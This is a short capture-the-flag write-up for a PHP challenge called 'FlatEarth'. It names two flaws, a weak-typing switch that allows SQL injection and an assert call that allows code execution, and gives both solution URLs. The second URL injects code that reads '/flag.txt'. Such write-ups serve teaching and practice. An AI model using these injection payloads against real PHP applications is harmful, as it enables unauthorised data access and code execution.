# FlatEarth
Trivial php chal

## Vuln
1. PHP switch weak typing -> SQLi
2. PHP assert -> RCE

## Solution
```
https://flatearth.corp.geegle.org/?type=2%20OR%20type=3
https://flatearth.corp.geegle.org/fe6df1ce-a892-4bcf-858d-4bbede6f0bac-staging/?type=proof%27)%20||%20var_dump(file_get_contents(%27/flag.txt%27));//
```
